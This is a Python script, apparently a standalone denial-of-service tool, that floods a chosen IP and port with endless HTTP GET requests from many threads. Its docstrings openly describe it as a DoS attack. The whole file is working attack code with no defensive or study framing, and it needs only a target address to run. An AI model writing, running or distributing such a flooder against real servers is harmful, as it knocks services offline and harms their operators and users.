#!/usr/bin/python3

# Imports
import os
import sys
import getopt
import threading
import socket

class HTTPFlood(threading.Thread):
	"""Flood the target with HTTP
	requests
	
	Methods:
		__init__() - Initialize the object
		run() - Start the DoS attack
	"""
	
	def __init__(self, target_ip, target_port):
		"""Initialize the object
		
		Arguments:
			self - object - The HTTPFlood
			target_ip - string - The IP to flood
			target_port - integer - The port to flood
		"""
		
		# Append everything to self
		threading.Thread.__init__(self)
		self.target_ip = target_ip
		self.target_port = int(target_port)
		self.payload = "GET / HTTP/1.0\r\n\r\n"
		
	def run(self):
		"""Start the DoS attack
		
		Arguments:
			self - object - The HTTPFlood object
		"""
		
		# Create an infinite loop
		while True:
			# Create the socket
			attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			
			# Connect to target
			attack_socket.connect((self.target_ip, self.target_port))
			
			# Create infinite loop
			while True:
				# Attempt to transmit data
				try:
					attack_socket.send(bytes(self.payload.encode("utf-8")))
				except socket.error:
					# Break from the infinite loop
					break
					
			# Close the socket
			attack_socket.close()
				
def begin(attack_threads, target_ip, target_port):
	"""Create attack threads
	
	Arguments:
		attack_threads - intiger - The number of threads
		target_ip - string - The IP to flood
		target_port - intiger - The port to flood
	"""
	
	# Create the threads
	for _ in range(int(attack_threads)):
		# Create the attack thread
		attack_thread = HTTPFlood(target_ip, target_port)
		
		# Start the thread
		attack_thread.start()
